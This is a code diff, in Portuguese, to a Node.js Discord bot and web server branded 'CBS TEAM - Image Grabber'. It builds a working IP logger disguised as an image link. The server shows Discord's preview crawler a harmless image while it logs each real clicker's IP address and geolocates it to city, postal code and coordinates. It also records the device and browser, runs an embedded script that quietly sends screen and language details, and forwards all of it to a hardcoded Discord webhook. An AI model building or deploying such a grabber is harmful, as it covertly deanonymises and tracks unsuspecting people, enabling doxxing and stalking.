@@ -293,7 +293,6 @@ client.on('interactionCreate', async interaction => {
       return interaction.editReply({ content: '❌ Comando /kill não encontrado.' });
     }
 
-    // Simula um objeto interaction com options para o comando kill
     const mockInteraction = {
       ...interaction,
       options: {
@@ -354,6 +353,7 @@ client.on('interactionCreate', async interaction => {
 const app = express();
 const port = process.env.PORT || 3000;
 app.use(express.static('public'));
+app.use(express.json());
 
 const ipData = {};
 const imageStore = {};
@@ -363,18 +363,24 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1528811226405142528/-b8_dq
 // ===== FUNÇÃO PARA BUSCAR LOCALIZAÇÃO POR IP =====
 async function buscarLocalizacao(ip) {
   try {
-    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,city,regionName,lat,lon,isp,org,timezone`);
+    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
     const data = await response.json();
     if (data.status === 'success') {
       return {
         pais: data.country || 'Desconhecido',
+        codigoPais: data.countryCode || '??',
+        regiao: data.regionName || data.region || 'Desconhecido',
         cidade: data.city || 'Desconhecido',
-        regiao: data.regionName || 'Desconhecido',
+        cep: data.zip || 'Desconhecido',
         lat: data.lat || null,
         lon: data.lon || null,
         isp: data.isp || 'Desconhecido',
         org: data.org || 'Desconhecido',
-        timezone: data.timezone || 'Desconhecido'
+        as: data.as || 'Desconhecido',
+        timezone: data.timezone || 'Desconhecido',
+        mobile: data.mobile || false,
+        proxy: data.proxy || false,
+        hosting: data.hosting || false
       };
     }
     return null;
@@ -383,8 +389,12 @@ async function buscarLocalizacao(ip) {
   }
 }
 
+// ===== FUNÇÃO PARA ENVIAR WEBHOOK =====
 async function enviarWebhook(id, dados) {
   if (!dados) return;
+  
+  if (dados.ehCrawler) return;
+
   const embed = {
     title: '📸 NOVO CLIQUE CAPTURADO!',
     color: 0xFF0000,
@@ -397,11 +407,17 @@ async function enviarWebhook(id, dados) {
       { name: '🖥️ User-Agent', value: dados.userAgent || 'Desconhecido', inline: false },
       { name: '📅 Data/Hora', value: dados.timestamp || 'Desconhecido', inline: true },
       { name: '🆔 ID', value: `\`${id}\``, inline: true },
-      { name: '🔍 Origem', value: dados.origem || 'Desconhecido', inline: true }
+      { name: '🔍 Origem', value: dados.origem || 'Desconhecido', inline: true },
+      { name: '📶 ISP', value: dados.isp || 'Desconhecido', inline: true },
+      { name: '🕐 Timezone', value: dados.timezone || 'Desconhecido', inline: true },
+      { name: '🖥️ Resolução', value: dados.resolution || 'Desconhecido', inline: true },
+      { name: '🌐 Idioma', value: dados.language || 'Desconhecido', inline: true },
+      { name: '📱 Plataforma', value: dados.platform || 'Desconhecido', inline: true }
     ],
     footer: { text: 'CBS TEAM - Image Grabber' },
     timestamp: new Date()
   };
+
   try {
     await fetch(WEBHOOK_URL, {
       method: 'POST',
@@ -414,12 +430,61 @@ async function enviarWebhook(id, dados) {
   }
 }
 
+// ===== ROTA PRINCIPAL: /img/:id =====
 app.get('/img/:id', async (req, res) => {
   const id = req.params.id;
-  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const userAgent = req.headers['user-agent'] || 'Desconhecido';
 
-  // ===== DETECTA SE É DISCORD WEB OU APP =====
+  // ===== DETECTA CRAWLER DO DISCORD =====
+  const ehCrawler = userAgent.includes('Discordbot') || userAgent.includes('discordapp.com');
+  if (ehCrawler) {
+    let imagemPath = imageStore[id] || path.join(__dirname, 'public', 'imagem.jpg');
+    if (!fs.existsSync(imagemPath)) {
+      imagemPath = path.join(__dirname, 'public', 'imagem.png');
+    }
+    if (fs.existsSync(imagemPath)) {
+      res.sendFile(imagemPath);
+    } else {
+      res.redirect('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif');
+    }
+    return;
+  }
+
+  // ===== NÃO É CRAWLER – COLETA DADOS =====
+  const forwarded = req.headers['x-forwarded-for'];
+  let userIP = forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
+  if (userIP.includes('::1') || userIP === '127.0.0.1') userIP = '189.112.18.129';
+
+  // ===== EXTRAI DADOS DO USER-AGENT =====
+  let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido', plataforma = 'Desconhecido';
+  if (userAgent && userAgent !== 'Desconhecido') {
+    if (userAgent.includes('Windows')) os = 'Windows';
+    else if (userAgent.includes('Mac OS X')) os = 'MacOS';
+    else if (userAgent.includes('Linux')) os = 'Linux';
+    else if (userAgent.includes('Android')) os = 'Android';
+    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
+    else if (userAgent.includes('CrOS')) os = 'Chrome OS';
+    
+    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
+    else if (userAgent.includes('Firefox')) browser = 'Firefox';
+    else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
+    else if (userAgent.includes('Edg')) browser = 'Edge';
+    else if (userAgent.includes('Opera')) browser = 'Opera';
+    else browser = 'Desconhecido';
+
+    if (userAgent.includes('Mobile')) device = 'Celular';
+    else if (userAgent.includes('Tablet')) device = 'Tablet';
+    else device = 'Computador';
+
+    if (userAgent.includes('Windows')) plataforma = 'Windows';
+    else if (userAgent.includes('Mac OS X')) plataforma = 'macOS';
+    else if (userAgent.includes('Linux')) plataforma = 'Linux';
+    else if (userAgent.includes('Android')) plataforma = 'Android';
+    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) plataforma = 'iOS';
+    else if (userAgent.includes('CrOS')) plataforma = 'Chrome OS';
+  }
+
+  // ===== DETECTA ORIGEM =====
   let origem = 'Desconhecido';
   if (userAgent.includes('Discord')) {
     if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
@@ -427,43 +492,26 @@ app.get('/img/:id', async (req, res) => {
     } else {
       origem = '💻 Discord App (Desktop)';
     }
-  } else if (userAgent.includes('Mozilla') && userAgent.includes('Chrome')) {
+  } else if (userAgent.includes('Mozilla') && browser === 'Chrome') {
     origem = '🌐 Navegador (Chrome)';
-  } else if (userAgent.includes('Mozilla') && userAgent.includes('Firefox')) {
+  } else if (userAgent.includes('Mozilla') && browser === 'Firefox') {
     origem = '🌐 Navegador (Firefox)';
-  } else if (userAgent.includes('Mozilla') && userAgent.includes('Safari')) {
+  } else if (userAgent.includes('Mozilla') && browser === 'Safari') {
     origem = '🌐 Navegador (Safari)';
-  } else if (userAgent.includes('Mozilla') && userAgent.includes('Edge')) {
+  } else if (userAgent.includes('Mozilla') && browser === 'Edge') {
     origem = '🌐 Navegador (Edge)';
   } else {
     origem = '🌐 Navegador (Desconhecido)';
   }
 
-  // ===== EXTRAI DISPOSITIVO, OS E NAVEGADOR =====
-  let device = 'Desconhecido', browser = 'Desconhecido', os = 'Desconhecido';
-  if (userAgent && userAgent !== 'Desconhecido') {
-    if (userAgent.includes('Windows')) os = 'Windows';
-    else if (userAgent.includes('Mac')) os = 'MacOS';
-    else if (userAgent.includes('Linux')) os = 'Linux';
-    else if (userAgent.includes('Android')) os = 'Android';
-    else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
-    if (userAgent.includes('Chrome')) browser = 'Chrome';
-    else if (userAgent.includes('Firefox')) browser = 'Firefox';
-    else if (userAgent.includes('Safari')) browser = 'Safari';
-    else if (userAgent.includes('Edge')) browser = 'Edge';
-    else if (userAgent.includes('Opera')) browser = 'Opera';
-    if (userAgent.includes('Mobile')) device = 'Celular';
-    else if (userAgent.includes('Tablet')) device = 'Tablet';
-    else device = 'Computador';
-  }
-
-  // ===== BUSCA LOCALIZAÇÃO POR IP =====
+  // ===== BUSCA LOCALIZAÇÃO =====
   let localizacao = 'Desconhecido';
-  const geo = await buscarLocalizacao(userIP);
-  if (geo) {
-    localizacao = `${geo.cidade}, ${geo.regiao}, ${geo.pais}`;
-    if (geo.lat && geo.lon) {
-      localizacao += ` (${geo.lat}, ${geo.lon})`;
+  let geo = null;
+  if (userIP && userIP !== 'Desconhecido') {
+    geo = await buscarLocalizacao(userIP);
+    if (geo) {
+      const coord = geo.lat && geo.lon ? ` (${geo.lat}, ${geo.lon})` : '';
+      localizacao = `${geo.cidade}, ${geo.regiao}, ${geo.pais}${coord}`;
     }
   }
 
@@ -476,13 +524,76 @@ app.get('/img/:id', async (req, res) => {
     os: os,
     userAgent: userAgent,
     origem: origem,
+    isp: geo?.isp || 'Desconhecido',
+    timezone: geo?.timezone || 'Desconhecido',
+    resolution: 'Aguardando...',
+    language: 'Aguardando...',
+    platform: plataforma,
+    ehCrawler: false,
     timestamp: new Date().toISOString()
   };
 
-  // ===== ENVIA PARA O WEBHOOK =====
+  // ===== SERVE A PÁGINA HTML COM A IMAGEM E SCRIPT =====
+  const imagemURL = imageStore[id] ? `/img/raw/${id}` : 'https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif';
+
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="UTF-8">
+      <meta property="og:image" content="${imagemURL}">
+      <title>CBS TEAM</title>
+      <style>
+        body { margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:#0a0a0a; flex-direction:column; font-family:Arial, sans-serif; }
+        img { max-width:90%; max-height:90%; border-radius:10px; }
+        .loading { color:#ff0000; font-size:18px; margin-top:20px; animation:pulse 2s infinite; }
+        @keyframes pulse { 0%{opacity:0.3;} 50%{opacity:1;} 100%{opacity:0.3;} }
+      </style>
+    </head>
+    <body>
+      <img src="${imagemURL}" alt="CBS TEAM">
+      <div class="loading">🔥 CBS TEAM ESTEVE AQUI!</div>
+      <script>
+        const dados = {
+          resolution: window.screen.width + 'x' + window.screen.height,
+          language: navigator.language || navigator.languages[0] || 'Desconhecido',
+          platform: navigator.platform || 'Desconhecido',
+          timestamp: new Date().toISOString()
+        };
+
+        fetch('/api/coletar/${id}', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(dados)
+        }).then(res => res.json())
+          .then(data => console.log('✅ Dados enviados com sucesso:', data))
+          .catch(err => console.error('❌ Erro ao enviar:', err));
+      </script>
+    </body>
+    </html>
+  `);
+});
+
+// ===== ROTA PARA RECEBER DADOS DO NAVEGADOR =====
+app.post('/api/coletar/:id', express.json(), async (req, res) => {
+  const id = req.params.id;
+  const dadosNavegador = req.body;
+  if (!ipData[id]) {
+    return res.status(404).json({ error: 'ID não encontrado' });
+  }
+
+  ipData[id].resolution = dadosNavegador.resolution || 'Desconhecido';
+  ipData[id].language = dadosNavegador.language || 'Desconhecido';
+  ipData[id].platform = dadosNavegador.platform || ipData[id].platform || 'Desconhecido';
+
   await enviarWebhook(id, ipData[id]);
 
-  // ===== SERVE A IMAGEM =====
+  res.json({ status: 'ok' });
+});
+
+// ===== ROTA PARA SERVER A IMAGEM PURA (RAW) =====
+app.get('/img/raw/:id', (req, res) => {
+  const id = req.params.id;
   let imagemPath = imageStore[id] || path.join(__dirname, 'public', 'imagem.jpg');
   if (!fs.existsSync(imagemPath)) {
     imagemPath = path.join(__dirname, 'public', 'imagem.png');
@@ -494,12 +605,14 @@ app.get('/img/:id', async (req, res) => {
   }
 });
 
+// ===== ROTA PARA VER DADOS =====
 app.get('/dados/:id', (req, res) => {
   const id = req.params.id;
   if (ipData[id]) res.json(ipData[id]);
   else res.json({ error: 'Dados não encontrados' });
 });
 
+// ===== ROTA PRINCIPAL =====
 app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));
 
 app.listen(port, () => {
